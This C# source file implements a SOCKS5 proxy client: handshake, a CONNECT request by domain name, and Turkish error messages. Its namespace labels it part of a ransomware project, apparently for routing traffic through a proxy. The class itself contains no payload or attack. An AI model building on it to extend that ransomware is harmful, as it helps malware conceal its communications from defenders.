using System;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Diagnostics;

namespace Ransomware.Webİşlev.SOCKS
{
    class SOCKS5 : ISOCKS
    {
        private readonly byte ver = 0x05;
        private readonly byte cmd = 0x01;
        private readonly byte rsv = 0x00;
        private readonly byte atyp = 0x03;
        private readonly byte nmethods = 0x01;
        private readonly byte methods = 0x00;

        private string proxyIp
        {
            set; get;
        }

        private short proxyPort
        {
            set; get;
        }

        private Dictionary<byte, string> hatalarDogrulama = new Dictionary<byte, string>();
        private Dictionary<byte, string> hatalarBaglanti = new Dictionary<byte, string>();

        public SOCKS5(string proxyIp, short proxyPort)
        {
            this.proxyIp = proxyIp;
            this.proxyPort = proxyPort;

            hatalarDogrulama.Add(1, "GSSAPI");
            hatalarDogrulama.Add(2, "USERNAME/PASSWORD");
            hatalarDogrulama.Add(3, "to X'7F' IANA ASSIGNED");
            hatalarDogrulama.Add(128, "to X'FE' RESERVED FOR PRIVATE METHODS");
            hatalarDogrulama.Add(255, "NO ACCEPTABLE METHODS");

            hatalarBaglanti.Add(1, "general SOCKS server failure");
            hatalarBaglanti.Add(2, "connection not allowed by ruleset");
            hatalarBaglanti.Add(3, "Network unreachable");
            hatalarBaglanti.Add(4, "Host unreachable");
            hatalarBaglanti.Add(5, "Connection refused");
            hatalarBaglanti.Add(6, "TTL expired");
            hatalarBaglanti.Add(7, "Command not supported");
            hatalarBaglanti.Add(8, "Address type not supported");
            hatalarBaglanti.Add(9, "to X'FF' unassigned");
        }

        public Socket SOCKSBaglan(string ip, short port)
        {
            Socket soket = null;

            try
            {
                soket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                byte[] buffer = new byte[4096];
                int uzunluk;

                byte ipUzunlugu = Convert.ToByte(ip.Length);
                byte[] ipBytes = Encoding.Default.GetBytes(ip);
                byte[] portBigEndian = BigEndian(port);

                soket.SendTimeout = 25000;
                soket.ReceiveTimeout = 25000;

                soket.Connect(new IPEndPoint(IPAddress.Parse(proxyIp), proxyPort));

                soket.Send(new byte[] { ver, nmethods, methods });

                uzunluk = soket.Receive(buffer);

                if (buffer[1] != 0)
                {
                    Debug.WriteLine("Hata: Vekil sunucuya bağlanılamadı: " + hatalarDogrulama[buffer[1]]);
                    soket.Dispose();

                    throw new Exception();
                }

                soket.Send(new byte[] { ver, cmd, rsv, atyp, ipUzunlugu }.Concat(ipBytes).Concat(portBigEndian).ToArray());

                uzunluk = soket.Receive(buffer);

                if (buffer[1] != 0)
                {
                    Console.WriteLine("Hata: Belirtilen sunucuya bağlanılamadı: " + hatalarBaglanti[buffer[1]]);
                    soket.Dispose();

                    throw new Exception();
                }
            }
            catch
            {
                soket.Dispose();
                throw new Exception();    
            }

            return soket;
        }

        private byte[] BigEndian(short port)
        {
            byte[] bytes = new byte[2];
            bytes[0] = (byte)(port >> 8);
            bytes[1] = (byte)port;

            return bytes;
        }

    }
}
